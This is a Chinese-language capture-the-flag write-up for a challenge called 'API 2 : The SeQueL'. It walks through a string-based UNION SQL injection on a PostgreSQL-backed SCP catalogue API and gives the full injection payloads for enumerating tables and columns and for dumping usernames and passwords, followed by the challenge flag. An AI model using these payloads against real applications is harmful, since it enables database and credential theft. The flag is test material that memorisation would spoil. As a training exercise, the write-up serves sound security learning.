# API 2 : The SeQueL

## 题目简述

题目是一个 SCP 条目展示站点，后端接口通过 `name` 参数查询条目。题名中的 `SeQueL` 明示 SQL 注入。实际漏洞点是 `/api/scp?name=...` 的字符串型 SQL 注入，数据库为 PostgreSQL，第三列使用枚举类型 `contlevel`。

目标是通过 UNION 查询枚举数据库结构，读取 `users` 表中的 admin 记录，得到 flag。

## 解题过程

### 关键观察

正常查询 `name=Default` 能返回 SCP 卡片数据；追加单引号会导致空响应或错误；构造恒真条件可返回更多条目：

```bash
curl -s "/api/scp?name=Default%27%20OR%20%271%27%3D%271"
```

随后用 `ORDER BY` 判断列数为 5。UNION 测试时错误信息暴露 `pq`，并提示第三列是 `contlevel` 枚举，因此可用合法枚举值 `safe` 填充第三列。

### 利用步骤

可用的 UNION 形态：

```sql
' UNION SELECT 1,'b','safe','d','e'--
```

枚举 public schema 下的表：

```sql
' UNION SELECT 1,table_name,'safe','d','e'
FROM information_schema.tables
WHERE table_schema='public'--
```

得到 `users`、`experiments`。继续枚举 `users` 表列：

```sql
' UNION SELECT 1,column_name,'safe','d','e'
FROM information_schema.columns
WHERE table_name='users'--
```

得到 `id, name, password, status`。最终导出用户数据：

```sql
' UNION SELECT id,name,'safe',password,'e' FROM users--
```

admin 记录的 password 字段即为：

```text
gigem{SQL_1nj3ct1ons_c4n_b3_fun}
```

## 方法总结

- 核心技巧：字符串型 UNION SQL 注入，结合 PostgreSQL 错误信息确定列数和类型。
- 识别信号：题名或接口暗示 SQL，参数可控且单引号影响响应时，应先确认注入类型、列数和回显列。
- 复用要点：UNION 的每列类型必须匹配；遇到枚举列时要使用合法枚举值占位，否则查询会被类型错误打断。
